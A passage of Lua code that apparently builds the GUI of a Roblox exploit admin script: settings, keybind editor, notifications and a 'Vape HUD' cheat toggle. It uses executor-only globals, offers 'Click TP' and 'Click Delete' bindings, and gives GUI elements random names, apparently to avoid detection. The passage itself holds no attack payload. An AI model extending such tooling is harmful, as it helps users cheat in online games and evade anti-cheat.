SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 295)
SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.ScrollBarThickness = 8
SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.VerticalScrollBarInset = "Always"
SettingsHolder.ZIndex = 10
table.insert(scroll, SettingsHolder)
Prefix.Name = "Prefix"
Prefix.Parent = SettingsHolder
Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Prefix.BorderSizePixel = 0
Prefix.BackgroundTransparency = 1
Prefix.Position = UDim2.new(0, 5, 0, 5)
Prefix.Size = UDim2.new(1, -10, 0, 20)
Prefix.Font = Enum.Font.SourceSans
Prefix.TextSize = 14
Prefix.Text = "Prefix"
Prefix.TextColor3 = Color3.new(1, 1, 1)
Prefix.TextXAlignment = Enum.TextXAlignment.Left
Prefix.ZIndex = 10
table.insert(shade2, Prefix)
table.insert(text1, Prefix)
PrefixBox.Name = "PrefixBox"
PrefixBox.Parent = Prefix
PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
PrefixBox.BorderSizePixel = 0
PrefixBox.Position = UDim2.new(1, -20, 0, 0)
PrefixBox.Size = UDim2.new(0, 20, 0, 20)
PrefixBox.Font = Enum.Font.SourceSansBold
PrefixBox.TextSize = 14
PrefixBox.Text = ""
PrefixBox.TextColor3 = Color3.new(0, 0, 0)
PrefixBox.ZIndex = 10
table.insert(shade3, PrefixBox)
table.insert(text2, PrefixBox)

makeSettingsButton = function(text, image, arg)
	local textButton2 = Instance.new("TextButton")
	textButton2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	textButton2.BorderSizePixel = 0
	textButton2.Position = UDim2.new(0, 0, 0, 0)
	textButton2.Size = UDim2.new(1, 0, 0, 25)
	textButton2.Text = ""
	textButton2.ZIndex = 10
	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "Icon"
	imageLabel.Parent = textButton2
	imageLabel.Position = UDim2.new(0, 5, 0, 5)
	imageLabel.Size = UDim2.new(0, 16, 0, 16)
	imageLabel.BackgroundTransparency = 1
	imageLabel.Image = image
	imageLabel.ZIndex = 10

	if arg then
		imageLabel.ScaleType = Enum.ScaleType.Crop
		imageLabel.ImageRectSize = Vector2.new(16, 16)
		imageLabel.ImageRectOffset = Vector2.new(arg, 0)
	end

	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "ButtonLabel"
	textLabel.Parent = textButton2
	textLabel.BackgroundTransparency = 1
	textLabel.Text = text
	textLabel.Position = UDim2.new(0, 28, 0, 0)
	textLabel.Size = UDim2.new(1, -28, 1, 0)
	textLabel.Font = Enum.Font.SourceSans
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextSize = 14
	textLabel.ZIndex = 10
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(shade2, textButton2)
	table.insert(text1, textLabel)
	return textButton2
end

ColorsButton = makeSettingsButton("Edit Theme", "rbxassetid://4911962991")
ColorsButton.Position = UDim2.new(0, 5, 0, 55)
ColorsButton.Size = UDim2.new(1, -10, 0, 25)
ColorsButton.Name = "Colors"
ColorsButton.Parent = SettingsHolder
Keybinds = makeSettingsButton("Edit Keybinds", "rbxassetid://129697930")
Keybinds.Position = UDim2.new(0, 5, 0, 85)
Keybinds.Size = UDim2.new(1, -10, 0, 25)
Keybinds.Name = "Keybinds"
Keybinds.Parent = SettingsHolder
Aliases = makeSettingsButton("Edit Aliases", "rbxassetid://5147488658")
Aliases.Position = UDim2.new(0, 5, 0, 115)
Aliases.Size = UDim2.new(1, -10, 0, 25)
Aliases.Name = "Aliases"
Aliases.Parent = SettingsHolder
StayOpen.Name = "StayOpen"
StayOpen.Parent = SettingsHolder
StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
StayOpen.BorderSizePixel = 0
StayOpen.BackgroundTransparency = 1
StayOpen.Position = UDim2.new(0, 5, 0, 30)
StayOpen.Size = UDim2.new(1, -10, 0, 20)
StayOpen.Font = Enum.Font.SourceSans
StayOpen.TextSize = 14
StayOpen.Text = "Keep Menu Open"
StayOpen.TextColor3 = Color3.new(1, 1, 1)
StayOpen.TextXAlignment = Enum.TextXAlignment.Left
StayOpen.ZIndex = 10
table.insert(shade2, StayOpen)
table.insert(text1, StayOpen)
Button.Name = "Button"
Button.Parent = StayOpen
Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(1, -20, 0, 0)
Button.Size = UDim2.new(0, 20, 0, 20)
Button.ZIndex = 10
table.insert(shade3, Button)
On.Name = "On"
On.Parent = Button
On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
On.BackgroundTransparency = 1
On.BorderSizePixel = 0
On.Position = UDim2.new(0, 2, 0, 2)
On.Size = UDim2.new(0, 16, 0, 16)
On.Font = Enum.Font.SourceSans
On.FontSize = Enum.FontSize.Size14
On.Text = ""
On.TextColor3 = Color3.new(0, 0, 0)
On.ZIndex = 10
Positions = makeSettingsButton("Edit/Goto Waypoints", "rbxassetid://5147488592")
Positions.Position = UDim2.new(0, 5, 0, 145)
Positions.Size = UDim2.new(1, -10, 0, 25)
Positions.Name = "Waypoints"
Positions.Parent = SettingsHolder
EventBind = makeSettingsButton("Edit Event Binds", "rbxassetid://5147695474", 759)
EventBind.Position = UDim2.new(0, 5, 0, 205)
EventBind.Size = UDim2.new(1, -10, 0, 25)
EventBind.Name = "EventBinds"
EventBind.Parent = SettingsHolder
Plugins = makeSettingsButton("Manage Plugins", "rbxassetid://5147695474", 743)
Plugins.Position = UDim2.new(0, 5, 0, 175)
Plugins.Size = UDim2.new(1, -10, 0, 25)
Plugins.Name = "Plugins"
Plugins.Parent = SettingsHolder

do
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "VapeHudSetting"
	textLabel.Parent = SettingsHolder
	textLabel.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	textLabel.BorderSizePixel = 0
	textLabel.BackgroundTransparency = 1
	textLabel.Position = UDim2.new(0, 5, 0, 235)
	textLabel.Size = UDim2.new(1, -10, 0, 20)
	textLabel.Font = Enum.Font.SourceSans
	textLabel.TextSize = 14
	textLabel.Text = "Target / Vape HUD"
	textLabel.TextColor3 = Color3.new(1, 1, 1)
	textLabel.TextXAlignment = Enum.TextXAlignment.Left
	textLabel.ZIndex = 10
	table.insert(shade2, textLabel)
	table.insert(text1, textLabel)
	local frame2 = Instance.new("Frame")
	frame2.Name = "Button"
	frame2.Parent = textLabel
	frame2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	frame2.BorderSizePixel = 0
	frame2.Position = UDim2.new(1, -20, 0, 0)
	frame2.Size = UDim2.new(0, 20, 0, 20)
	frame2.ZIndex = 10
	table.insert(shade3, frame2)
	local textButton2 = Instance.new("TextButton")
	textButton2.Name = "On"
	textButton2.Parent = frame2
	textButton2.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
	textButton2.BackgroundTransparency = 0
	textButton2.BorderSizePixel = 0
	textButton2.Position = UDim2.new(0, 2, 0, 2)
	textButton2.Size = UDim2.new(0, 16, 0, 16)
	textButton2.Font = Enum.Font.SourceSans
	textButton2.Text = ""
	textButton2.ZIndex = 10

	textButton2.MouseButton1Click:Connect(function()
		if getgenv().setVapeHudEnabled then
			getgenv().setVapeHudEnabled()
		end
	end)

	local textLabel2 = Instance.new("TextLabel")
	textLabel2.Name = "VapeKeySetting"
	textLabel2.Parent = SettingsHolder
	textLabel2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	textLabel2.BorderSizePixel = 0
	textLabel2.BackgroundTransparency = 1
	textLabel2.Position = UDim2.new(0, 5, 0, 260)
	textLabel2.Size = UDim2.new(1, -10, 0, 20)
	textLabel2.Font = Enum.Font.SourceSans
	textLabel2.TextSize = 14
	textLabel2.Text = "HUD Toggle Key"
	textLabel2.TextColor3 = Color3.new(1, 1, 1)
	textLabel2.TextXAlignment = Enum.TextXAlignment.Left
	textLabel2.ZIndex = 10
	table.insert(shade2, textLabel2)
	table.insert(text1, textLabel2)
	local textBox = Instance.new("TextBox")
	textBox.Name = "VapeKeyBox"
	textBox.Parent = textLabel2
	textBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	textBox.BorderSizePixel = 0
	textBox.Position = UDim2.new(1, -70, 0, 0)
	textBox.Size = UDim2.new(0, 70, 0, 20)
	textBox.Font = Enum.Font.SourceSansBold
	textBox.TextSize = 12
	textBox.Text = getgenv().VapeHudKey and getgenv().VapeHudKey.Name or "RightShift"
	textBox.TextColor3 = Color3.new(0, 0, 0)
	textBox.ZIndex = 10
	table.insert(shade3, textBox)
	table.insert(text2, textBox)

	getgenv().updateVapeHudSettingsUI = function(arg)
		pcall(function()
			textButton2.BackgroundTransparency = arg and 0 or 1
			textBox.Text = getgenv().VapeHudKey and getgenv().VapeHudKey.Name or "RightShift"
		end)
	end

	textBox.FocusLost:Connect(function()
		local str = textBox.Text:upper():gsub("%s+", "")

		if str ~= "" then
			local v = nil

			for _, v2 in pairs(Enum.KeyCode:GetEnumItems()) do
				if v2.Name:upper() == str then
					v = v2
					break
				else
					v = nil
				end
			end

			if v then
				getgenv().VapeHudKey = v
				textBox.Text = v.Name
				notify("Vape HUD", "HUD 토글 키가 [" .. v.Name .. "] 로 설정되었습니다", 3)

				if updatesaves then
					pcall(updatesaves)
				end
			else
				textBox.Text = getgenv().VapeHudKey and getgenv().VapeHudKey.Name or "RightShift"
				notify("Vape HUD", "유효하지 않은 키 이름입니다 (예: RightShift, K, RightControl)", 3)
			end
		end
	end)
end

Example.Name = "Example"
Example.Parent = Holder
Example.BackgroundTransparency = 1
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 20)
Example.Visible = false
Example.Font = Enum.Font.SourceSans
Example.TextSize = 18
Example.Text = "Example"
Example.TextColor3 = Color3.new(1, 1, 1)
Example.TextXAlignment = Enum.TextXAlignment.Left
Example.ZIndex = 10
table.insert(text1, Example)
Notification.Name = randomString()
Notification.Parent = PARENT
Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Notification.BorderSizePixel = 0
Notification.Position = UDim2.new(1, -500, 1, 20)
Notification.Size = UDim2.new(0, 250, 0, 100)
Notification.ZIndex = 10
table.insert(shade1, Notification)
Title_2.Name = "Title"
Title_2.Parent = Notification
Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 250, 0, 20)
Title_2.Font = Enum.Font.SourceSans
Title_2.TextSize = 14
Title_2.Text = "Notification Title"
Title_2.TextColor3 = Color3.new(1, 1, 1)
Title_2.ZIndex = 10
table.insert(shade2, Title_2)
table.insert(text1, Title_2)
Text_2.Name = "Text"
Text_2.Parent = Notification
Text_2.BackgroundTransparency = 1
Text_2.BorderSizePixel = 0
Text_2.Position = UDim2.new(0, 5, 0, 25)
Text_2.Size = UDim2.new(0, 240, 0, 75)
Text_2.Font = Enum.Font.SourceSans
Text_2.TextSize = 16
Text_2.Text = "Notification Text"
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextWrapped = true
Text_2.ZIndex = 10
table.insert(text1, Text_2)
CloseButton.Name = "CloseButton"
CloseButton.Parent = Notification
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(1, -20, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Text = ""
CloseButton.ZIndex = 10
CloseImage.Parent = CloseButton
CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
CloseImage.BackgroundTransparency = 1
CloseImage.Position = UDim2.new(0, 5, 0, 5)
CloseImage.Size = UDim2.new(0, 10, 0, 10)
CloseImage.Image = "rbxassetid://5054663650"
CloseImage.ZIndex = 10
PinButton.Name = "PinButton"
PinButton.Parent = Notification
PinButton.BackgroundTransparency = 1
PinButton.Size = UDim2.new(0, 20, 0, 20)
PinButton.ZIndex = 10
PinButton.Text = ""
PinImage.Parent = PinButton
PinImage.BackgroundColor3 = Color3.new(1, 1, 1)
PinImage.BackgroundTransparency = 1
PinImage.Position = UDim2.new(0, 3, 0, 3)
PinImage.Size = UDim2.new(0, 14, 0, 14)
PinImage.ZIndex = 10
PinImage.Image = "rbxassetid://6234691350"
Tooltip.Name = randomString()
Tooltip.Parent = PARENT
Tooltip.Active = true
Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Tooltip.BackgroundTransparency = 0.1
Tooltip.BorderSizePixel = 0
Tooltip.Size = UDim2.new(0, 200, 0, 96)
Tooltip.Visible = false
Tooltip.ZIndex = 10
table.insert(shade1, Tooltip)
Title_3.Name = "Title"
Title_3.Parent = Tooltip
Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Title_3.BackgroundTransparency = 0.1
Title_3.BorderSizePixel = 0
Title_3.Size = UDim2.new(0, 200, 0, 20)
Title_3.Font = Enum.Font.SourceSans
Title_3.TextSize = 14
Title_3.Text = ""
Title_3.TextColor3 = Color3.new(1, 1, 1)
Title_3.TextTransparency = 0.1
Title_3.ZIndex = 10
table.insert(shade2, Title_3)
table.insert(text1, Title_3)
Description.Name = "Description"
Description.Parent = Tooltip
Description.BackgroundTransparency = 1
Description.BorderSizePixel = 0
Description.Size = UDim2.new(0, 180, 0, 72)
Description.Position = UDim2.new(0, 10, 0, 18)
Description.Font = Enum.Font.SourceSans
Description.TextSize = 16
Description.Text = ""
Description.TextColor3 = Color3.new(1, 1, 1)
Description.TextTransparency = 0.1
Description.TextWrapped = true
Description.ZIndex = 10
table.insert(text1, Description)
IntroBackground.Name = "IntroBackground"
IntroBackground.Parent = Holder
IntroBackground.Active = true
IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
IntroBackground.BorderSizePixel = 0
IntroBackground.Position = UDim2.new(0, 0, 0, 45)
IntroBackground.Size = UDim2.new(0, 250, 0, 175)
IntroBackground.ZIndex = 10
Logo.Name = "Logo"
Logo.Parent = Holder
Logo.BackgroundTransparency = 1
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0, 125, 0, 127)
Logo.Size = UDim2.new(0, 10, 0, 10)
Logo.Image = getCustomAssetImage("https://raw.githubusercontent.com/unknown1024a-eng/unknownadminscript/refs/heads/main/trf3zkn.webp", "windbreaker_intro.webp")
Logo.ImageTransparency = 0
Logo.ZIndex = 10
Credits.Name = "Credits"
Credits.Parent = Holder
Credits.BackgroundTransparency = 1
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.9, 30)
Credits.Size = UDim2.new(0, 250, 0, 20)
Credits.Font = Enum.Font.SourceSansLight
Credits.FontSize = Enum.FontSize.Size18
Credits.Text = "unknown // nether // haru"
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.ZIndex = 10
KeybindsFrame.Name = "KeybindsFrame"
KeybindsFrame.Parent = Settings
KeybindsFrame.Active = true
KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
KeybindsFrame.BorderSizePixel = 0
KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
KeybindsFrame.ZIndex = 10
table.insert(shade1, KeybindsFrame)
Close.Name = "Close"
Close.Parent = KeybindsFrame
Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0, 205, 0, 150)
Close.Size = UDim2.new(0, 40, 0, 20)
Close.Font = Enum.Font.SourceSans
Close.TextSize = 14
Close.Text = "Close"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.ZIndex = 10
table.insert(shade2, Close)
table.insert(text1, Close)
Add.Name = "Add"
Add.Parent = KeybindsFrame
Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add.BorderSizePixel = 0
Add.Position = UDim2.new(0, 5, 0, 150)
Add.Size = UDim2.new(0, 40, 0, 20)
Add.Font = Enum.Font.SourceSans
Add.TextSize = 14
Add.Text = "Add"
Add.TextColor3 = Color3.new(1, 1, 1)
Add.ZIndex = 10
table.insert(shade2, Add)
table.insert(text1, Add)
Delete.Name = "Delete"
Delete.Parent = KeybindsFrame
Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0, 50, 0, 150)
Delete.Size = UDim2.new(0, 40, 0, 20)
Delete.Font = Enum.Font.SourceSans
Delete.TextSize = 14
Delete.Text = "Clear"
Delete.TextColor3 = Color3.new(1, 1, 1)
Delete.ZIndex = 10
table.insert(shade2, Delete)
table.insert(text1, Delete)
Holder_2.Name = "Holder"
Holder_2.Parent = KeybindsFrame
Holder_2.BackgroundTransparency = 1
Holder_2.BorderSizePixel = 0
Holder_2.Position = UDim2.new(0, 0, 0, 0)
Holder_2.Size = UDim2.new(0, 250, 0, 145)
Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.ScrollBarThickness = 0
Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.VerticalScrollBarInset = "Always"
Holder_2.ZIndex = 10
Example_2.Name = "Example"
Example_2.Parent = KeybindsFrame
Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_2.BorderSizePixel = 0
Example_2.Size = UDim2.new(0, 10, 0, 20)
Example_2.Visible = false
Example_2.ZIndex = 10
table.insert(shade2, Example_2)
Text_3.Name = "Text"
Text_3.Parent = Example_2
Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_3.BorderSizePixel = 0
Text_3.Position = UDim2.new(0, 10, 0, 0)
Text_3.Size = UDim2.new(0, 240, 0, 20)
Text_3.Font = Enum.Font.SourceSans
Text_3.TextSize = 14
Text_3.Text = "nom"
Text_3.TextColor3 = Color3.new(1, 1, 1)
Text_3.TextXAlignment = Enum.TextXAlignment.Left
Text_3.ZIndex = 10
table.insert(shade2, Text_3)
table.insert(text1, Text_3)
Delete_2.Name = "Delete"
Delete_2.Parent = Text_3
Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_2.BorderSizePixel = 0
Delete_2.Position = UDim2.new(0, 200, 0, 0)
Delete_2.Size = UDim2.new(0, 40, 0, 20)
Delete_2.Font = Enum.Font.SourceSans
Delete_2.TextSize = 14
Delete_2.Text = "Delete"
Delete_2.TextColor3 = Color3.new(0, 0, 0)
Delete_2.ZIndex = 10
table.insert(shade3, Delete_2)
table.insert(text2, Delete_2)
KeybindEditor.Name = randomString()
KeybindEditor.Parent = PARENT
KeybindEditor.Active = true
KeybindEditor.BackgroundTransparency = 1
KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
KeybindEditor.ZIndex = 10
background_2.Name = "background"
background_2.Parent = KeybindEditor
background_2.Active = true
background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_2.BorderSizePixel = 0
background_2.Position = UDim2.new(0, 0, 0, 20)
background_2.Size = UDim2.new(0, 360, 0, 185)
background_2.ZIndex = 10
table.insert(shade1, background_2)
Dark_3.Name = "Dark"
Dark_3.Parent = background_2
Dark_3.Active = true
Dark_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Dark_3.BorderSizePixel = 0
Dark_3.Position = UDim2.new(0, 135, 0, 0)
Dark_3.Size = UDim2.new(0, 2, 0, 185)
Dark_3.ZIndex = 10
table.insert(shade2, Dark_3)
Directions.Name = "Directions"
Directions.Parent = background_2
Directions.BackgroundTransparency = 1
Directions.BorderSizePixel = 0
Directions.Position = UDim2.new(0, 10, 0, 15)
Directions.Size = UDim2.new(0, 115, 0, 90)
Directions.ZIndex = 10
Directions.Font = Enum.Font.SourceSans
Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
Directions.TextColor3 = Color3.fromRGB(255, 255, 255)
Directions.TextSize = 14
Directions.TextWrapped = true
Directions.TextYAlignment = Enum.TextYAlignment.Top
table.insert(text1, Directions)
BindTo.Name = "BindTo"
BindTo.Parent = background_2
BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
BindTo.BorderSizePixel = 0
BindTo.Position = UDim2.new(0, 10, 0, 95)
BindTo.Size = UDim2.new(0, 115, 0, 50)
BindTo.ZIndex = 10
BindTo.Font = Enum.Font.SourceSans
BindTo.Text = "Click to bind"
BindTo.TextColor3 = Color3.fromRGB(255, 255, 255)
BindTo.TextSize = 16
table.insert(shade2, BindTo)
table.insert(text1, BindTo)
TriggerLabel.Name = "TriggerLabel"
TriggerLabel.Parent = background_2
TriggerLabel.BackgroundTransparency = 1
TriggerLabel.Position = UDim2.new(0, 10, 0, 155)
TriggerLabel.Size = UDim2.new(0, 45, 0, 20)
TriggerLabel.ZIndex = 10
TriggerLabel.Font = Enum.Font.SourceSans
TriggerLabel.Text = "Trigger:"
TriggerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TriggerLabel.TextSize = 14
TriggerLabel.TextXAlignment = Enum.TextXAlignment.Left
table.insert(text1, TriggerLabel)
BindTriggerSelect.Name = "BindTo"
BindTriggerSelect.Parent = background_2
BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
BindTriggerSelect.BorderSizePixel = 0
BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
BindTriggerSelect.ZIndex = 10
BindTriggerSelect.Font = Enum.Font.SourceSans
BindTriggerSelect.Text = "KeyDown"
BindTriggerSelect.TextColor3 = Color3.fromRGB(255, 255, 255)
BindTriggerSelect.TextSize = 16
table.insert(shade2, BindTriggerSelect)
table.insert(text1, BindTriggerSelect)
Add_2.Name = "Add"
Add_2.Parent = background_2
Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add_2.BorderSizePixel = 0
Add_2.Position = UDim2.new(0, 310, 0, 35)
Add_2.Size = UDim2.new(0, 40, 0, 20)
Add_2.ZIndex = 10
Add_2.Font = Enum.Font.SourceSans
Add_2.Text = "Add"
Add_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Add_2.TextSize = 14
table.insert(shade2, Add_2)
table.insert(text1, Add_2)
Toggles.Name = "Toggles"
Toggles.Parent = background_2
Toggles.BackgroundTransparency = 1
Toggles.BorderSizePixel = 0
Toggles.Position = UDim2.new(0, 150, 0, 125)
Toggles.Size = UDim2.new(0, 200, 0, 50)
Toggles.ZIndex = 10
Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Toggles.CanvasSize = UDim2.new(0, 0, 0, 50)
Toggles.ScrollBarThickness = 8
Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Toggles.VerticalScrollBarInset = Enum.ScrollBarInset.Always
table.insert(scroll, Toggles)
ClickTP.Name = "Click TP (Hold Key & Click)"
ClickTP.Parent = Toggles
ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ClickTP.BorderSizePixel = 0
ClickTP.Size = UDim2.new(0, 200, 0, 20)
ClickTP.ZIndex = 10
ClickTP.Font = Enum.Font.SourceSans
ClickTP.Text = "    Click TP (Hold Key & Click)"
ClickTP.TextColor3 = Color3.fromRGB(255, 255, 255)
ClickTP.TextSize = 14
ClickTP.TextXAlignment = Enum.TextXAlignment.Left
table.insert(shade2, ClickTP)
table.insert(text1, ClickTP)
Select.Name = "Select"
Select.Parent = ClickTP
Select.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select.BorderSizePixel = 0
Select.Position = UDim2.new(0, 160, 0, 0)
Select.Size = UDim2.new(0, 40, 0, 20)
Select.ZIndex = 10
Select.Font = Enum.Font.SourceSans
Select.Text = "Add"
Select.TextColor3 = Color3.fromRGB(0, 0, 0)
Select.TextSize = 14
table.insert(shade3, Select)
table.insert(text2, Select)
ClickDelete.Name = "Click Delete (Hold Key & Click)"
ClickDelete.Parent = Toggles
ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ClickDelete.BorderSizePixel = 0
ClickDelete.Position = UDim2.new(0, 0, 0, 25)
ClickDelete.Size = UDim2.new(0, 200, 0, 20)
ClickDelete.ZIndex = 10
ClickDelete.Font = Enum.Font.SourceSans
ClickDelete.Text = "    Click Delete (Hold Key & Click)"
ClickDelete.TextColor3 = Color3.fromRGB(255, 255, 255)
ClickDelete.TextSize = 14
ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
table.insert(shade2, ClickDelete)
table.insert(text1, ClickDelete)
Select_2.Name = "Select"
Select_2.Parent = ClickDelete
Select_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_2.BorderSizePixel = 0
Select_2.Position = UDim2.new(0, 160, 0, 0)
Select_2.Size = UDim2.new(0, 40, 0, 20)
Select_2.ZIndex = 10
Select_2.Font = Enum.Font.SourceSans
Select_2.Text = "Add"
Select_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Select_2.TextSize = 14
table.insert(shade3, Select_2)
table.insert(text2, Select_2)
Cmdbar_2.Name = "Cmdbar_2"
Cmdbar_2.Parent = background_2
Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Cmdbar_2.BorderSizePixel = 0
Cmdbar_2.Position = UDim2.new(0, 150, 0, 35)
Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
Cmdbar_2.ZIndex = 10
Cmdbar_2.Font = Enum.Font.SourceSans
Cmdbar_2.PlaceholderText = "Command"
Cmdbar_2.Text = ""
Cmdbar_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Cmdbar_2.TextSize = 14
Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left
Cmdbar_3.Name = "Cmdbar_3"
Cmdbar_3.Parent = background_2
Cmdbar_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Cmdbar_3.BorderSizePixel = 0
Cmdbar_3.Position = UDim2.new(0, 150, 0, 60)
Cmdbar_3.Size = UDim2.new(0, 150, 0, 20)
Cmdbar_3.ZIndex = 10
Cmdbar_3.Font = Enum.Font.SourceSans
Cmdbar_3.PlaceholderText = "Command 2"
Cmdbar_3.Text = ""
Cmdbar_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Cmdbar_3.TextSize = 14
Cmdbar_3.TextXAlignment = Enum.TextXAlignment.Left
CreateToggle.Name = "CreateToggle"
CreateToggle.Parent = background_2
CreateToggle.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
CreateToggle.BackgroundTransparency = 1
CreateToggle.BorderSizePixel = 0
CreateToggle.Position = UDim2.new(0, 152, 0, 10)
CreateToggle.Size = UDim2.new(0, 198, 0, 20)
CreateToggle.ZIndex = 10
CreateToggle.Font = Enum.Font.SourceSans
CreateToggle.Text = "Create Toggle"
CreateToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
CreateToggle.TextSize = 14
CreateToggle.TextXAlignment = Enum.TextXAlignment.Left
table.insert(text1, CreateToggle)
Button_2.Name = "Button"
Button_2.Parent = CreateToggle
Button_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Button_2.BorderSizePixel = 0
Button_2.Position = UDim2.new(1, -20, 0, 0)
Button_2.Size = UDim2.new(0, 20, 0, 20)
Button_2.ZIndex = 10
table.insert(shade3, Button_2)
On_2.Name = "On"
On_2.Parent = Button_2
On_2.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
On_2.BackgroundTransparency = 1
On_2.BorderSizePixel = 0
On_2.Position = UDim2.new(0, 2, 0, 2)
On_2.Size = UDim2.new(0, 16, 0, 16)
On_2.ZIndex = 10
On_2.Font = Enum.Font.SourceSans
On_2.Text = ""
On_2.TextColor3 = Color3.fromRGB(0, 0, 0)
On_2.TextSize = 14
shadow_2.Name = "shadow"
shadow_2.Parent = KeybindEditor
shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_2.BorderSizePixel = 0
shadow_2.Size = UDim2.new(0, 360, 0, 20)
shadow_2.ZIndex = 10
table.insert(shade2, shadow_2)
PopupText_2.Name = "PopupText_2"
PopupText_2.Parent = shadow_2
PopupText_2.BackgroundTransparency = 1
PopupText_2.Size = UDim2.new(1, 0, 0.949999988, 0)
PopupText_2.ZIndex = 10
PopupText_2.Font = Enum.Font.SourceSans
PopupText_2.Text = "Set Keybinds"
PopupText_2.TextColor3 = Color3.fromRGB(255, 255, 255)
PopupText_2.TextSize = 14
PopupText_2.TextWrapped = true
table.insert(text1, PopupText_2)
Exit_2.Name = "Exit_2"
Exit_2.Parent = shadow_2
Exit_2.BackgroundTransparency = 1
Exit_2.Position = UDim2.new(1, -20, 0, 0)
Exit_2.Size = UDim2.new(0, 20, 0, 20)
Exit_2.ZIndex = 10
Exit_2.Text = ""
ExitImage_2.Parent = Exit_2
ExitImage_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ExitImage_2.BackgroundTransparency = 1
ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
ExitImage_2.ZIndex = 10
ExitImage_2.Image = "rbxassetid://5054663650"
PositionsFrame.Name = "PositionsFrame"
PositionsFrame.Parent = Settings
PositionsFrame.Active = true
PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
PositionsFrame.BorderSizePixel = 0
